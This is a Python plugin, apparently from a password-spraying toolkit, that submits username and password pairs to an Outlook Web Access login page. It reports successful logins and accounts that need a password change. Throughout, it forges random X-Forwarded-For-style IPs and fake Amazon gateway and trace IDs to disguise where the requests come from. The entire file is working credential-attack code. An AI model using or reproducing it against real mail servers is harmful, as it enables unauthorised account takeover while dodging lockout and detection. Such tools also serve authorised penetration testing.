import json, datetime, requests, random


def generate_ip():

    return ".".join(str(random.randint(0,255)) for _ in range(4))


def generate_id():

    return "".join(random.choice("0123456789abcdefghijklmnopqrstuvwxyz") for _ in range(10))


def generate_trace_id():
    str = "Root=1-"
    first = "".join(random.choice("0123456789abcdef") for _ in range(8))
    second = "".join(random.choice("0123456789abcdef") for _ in range(24))
    return str + first + "-" + second


def owa_authenticate(url, username, password, useragent, pluginargs):

    ts = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')

    # not all of these are used, provided for future dev if needed
    # Only ones necessary to return at the moment are:
    # error
    # output
    # success
    data_response = {
        'timestamp': ts,
        'username': username,
        'password': password,
        'success': False,
        'change': False,
        'password_change': False,
        'type': None,
        'code': None,
        'name': None,
        'action': None,
        'headers': [],
        'cookies': [],
        'sourceip' : None,
        'throttled' : False,
        'error' : False,
        'output' : ""
    }

    spoofed_ip = generate_ip()
    amazon_id = generate_id()
    trace_id = generate_trace_id()

    domain = pluginargs['domain']
    url_real = pluginargs['url']

    cookies = {
            'PBack': '0'
    }

    headers = {
        'User-Agent': useragent,
        "X-My-X-Forwarded-For" : spoofed_ip,
        "x-amzn-apigateway-api-id" : amazon_id,
        "X-My-X-Amzn-Trace-Id" : trace_id,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Referer': f'{url_real}/owa/auth/logon.aspx?replaceCurrent=1&url={url_real}/owa/',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1',
        'Content-Type': 'application/x-www-form-urlencoded'
    }


    post_params = {
        "destination" : f'{url_real}/owa/',
        'flags': '0',
        'forcedownlevel': '0',
        'trusted': '0',
        'username': f'{domain}\{username}',
        'password': password,
        'isUtf8': '1'
    }


    try:

        resp = requests.post("{}/owa/auth.owa".format(url),data=post_params,headers=headers,cookies=cookies,allow_redirects=False)

        if resp.status_code == 302 and 'moved' in resp.text and 'Set-Cookie' in resp.headers:
            data_response['success'] = True
            data_response['output'] = '[+] SUCCESS: => {}:{}'.format(f'{domain}\{username}', password)

        elif resp.status_code == 302 and 'resetpassword' in resp.text and 'Set-Cookie' in resp.headers:
            data_response['success'] = True
            data_response['output'] = '[+] SUCCESS: PASSWORD CHANGE REQUIRED: => {}:{}'.format(f'{domain}\{username}', password)
            data_response['password_change'] = True

        elif 'Set-Cookie' not in resp.headers:
            data_response['success'] = False
            data_response['output'] = '[-] FAILED: {} => {}:{}'.format(resp.status_code, f'{domain}\{username}', password)

        else: #fail
            data_response['success'] = False
            data_response['output'] = '[-] FAILED: SOMETHING HAPPENED: {} => {}:{}'.format(resp.status_code, f'{domain}\{username}', password)

    except Exception as ex:
        data_response['error'] = True
        data_response['output'] = ex
        pass

    return data_response
